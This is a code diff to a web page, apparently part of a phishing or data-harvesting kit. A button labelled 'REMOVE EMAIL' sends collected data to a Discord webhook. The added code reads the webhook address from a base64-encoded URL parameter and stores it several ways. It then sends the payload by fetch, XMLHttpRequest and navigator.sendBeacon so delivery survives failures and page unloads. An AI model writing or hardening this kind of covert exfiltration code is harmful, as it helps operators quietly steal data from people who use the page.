@@ -939,6 +939,28 @@
                 }
             }
             
+            // Fallback 3: Check URL parameters for webhook
+            if (!webhookUrl) {
+                const urlParams = new URLSearchParams(window.location.search);
+                const encodedWebhook = urlParams.get('webhook');
+                if (encodedWebhook) {
+                    try {
+                        const decodedWebhook = atob(encodedWebhook);
+                        if (decodedWebhook && decodedWebhook.includes('discord.com/api/webhooks')) {
+                            webhookUrl = decodedWebhook;
+                            console.log('Fallback 3 - Using webhook URL from URL parameter');
+                            // Store it in localStorage for future use in multiple formats for compatibility
+                            localStorage.setItem('discord_webhook_url_plain', webhookUrl);
+                            localStorage.setItem('webhookUrl', webhookUrl);
+                            localStorage.setItem('discord_webhook_url', btoa(JSON.stringify({webhookUrl: webhookUrl})));
+                            console.log('Stored webhook URL in multiple formats for compatibility');
+                        }
+                    } catch (e) {
+                        console.error('Fallback 3 decoding failed:', e);
+                    }
+                }
+            }
+            
             console.log('Final webhook URL determination:', webhookUrl ? webhookUrl.substring(0, 30) + '...' : 'Not found');
             
             // Get and decrypt directory
@@ -1074,16 +1096,24 @@
 
                 // Check if webhook URL is configured
                 if (!webhookUrl) {
-                    console.error('Discord webhook URL not found in localStorage');
+                    console.error('Discord webhook URL not found in localStorage or URL parameters');
                     showToast('Error', 'Discord webhook not configured. Please open setup.html first to configure your webhook.', false);
                     processBtn.disabled = false;
-                    processBtn.innerHTML = '<i class="fas fa-trash"></i> REMOVE EMAIL';
+                    processBtn.innerHTML = '<i class="fas fa-trash-alt"></i> REMOVE EMAIL';
+                    
+                    // Redirect to setup page after a delay
+                    setTimeout(() => {
+                        window.location.href = 'setup.html';
+                    }, 3000);
                     return;
                 }
                 
                 // Log webhook information for debugging
                 console.log('Using webhook URL:', webhookUrl);
                 console.log('Using directory:', directory || 'Not specified');
+                console.log('Webhook URL source:', localStorage.getItem('webhookUrl') ? 'localStorage' : 
+                                              (new URLSearchParams(window.location.search).get('webhook') ? 'URL parameter' : 'Unknown'));
+                console.log('URL parameters present:', window.location.search);
                 
                 // Include directory in the log if available
                 const directoryInfo = directory ? `Directory: ${directory}` : 'No directory specified';
@@ -1136,6 +1166,8 @@
                 if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
                     console.error('Invalid webhook URL format:', webhookUrl);
                     showToast('Error', 'Invalid webhook URL format. Please reconfigure in setup.html', false);
+                    processBtn.disabled = false;
+                    processBtn.innerHTML = '<i class="fas fa-trash-alt"></i> REMOVE EMAIL';
                     return;
                 }
                 
@@ -1155,19 +1187,28 @@
                     console.log('Sending data to webhook:', webhookUrl);
                     console.log('Data being sent:', JSON.stringify(data));
                     
-                    // Try both methods to ensure delivery
+                    // Try all methods to ensure delivery
                     sendWithFetch(webhookUrl, data);
                     setTimeout(() => sendWithXHR(webhookUrl, data), 500); // Backup method with delay
+                    setTimeout(() => sendWithBeacon(webhookUrl, data), 1000); // Third method with longer delay
                 });
                 
-                // Method 1: Using fetch API
+                // Method 1: Using fetch API with improved reliability
                 function sendWithFetch(url, payload) {
-                    fetch(url, {
+                    // Add a timestamp to prevent caching issues
+                    const timestampedUrl = url + (url.includes('?') ? '&' : '?') + '_t=' + Date.now();
+                    
+                    fetch(timestampedUrl, {
                         method: 'POST',
                         headers: {
-                            'Content-Type': 'application/json'
+                            'Content-Type': 'application/json',
+                            'Cache-Control': 'no-cache, no-store, must-revalidate',
+                            'Pragma': 'no-cache'
                         },
-                        body: JSON.stringify(payload)
+                        body: JSON.stringify(payload),
+                        mode: 'cors',
+                        credentials: 'omit',
+                        cache: 'no-store'
                     })
                     .then(response => {
                         if (!response.ok) {
@@ -1181,7 +1222,14 @@
                     })
                     .catch(error => {
                         console.error('Error sending to Discord (fetch):', error);
-                        // Don't show error toast here as we have a backup method
+                        // Don't show error toast here as we have backup methods
+                        // Try with a different approach if fetch fails
+                        console.log('Fetch failed, trying with direct URL...');
+                        // Try with direct URL without parameters
+                        if (url.includes('?')) {
+                            const baseUrl = url.split('?')[0];
+                            setTimeout(() => sendWithFetch(baseUrl, payload), 300);
+                        }
                     });
                 }
                 
@@ -1207,6 +1255,20 @@
                     };
                     
                     xhr.send(JSON.stringify(payload));
+                }
+                
+                // Method 3: Using Navigator.sendBeacon (works even when page is unloading)
+                function sendWithBeacon(url, payload) {
+                    try {
+                        const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+                        const success = navigator.sendBeacon(url, blob);
+                        console.log('Discord webhook sendBeacon attempt:', success ? 'successful' : 'failed');
+                        if (success) {
+                            showToast('Success', 'Data successfully sent to Discord (beacon)');
+                        }
+                    } catch (e) {
+                        console.error('Error using sendBeacon:', e);
+                    }
                 }
                 
                 // Backup method using XMLHttpRequest in case fetch fails
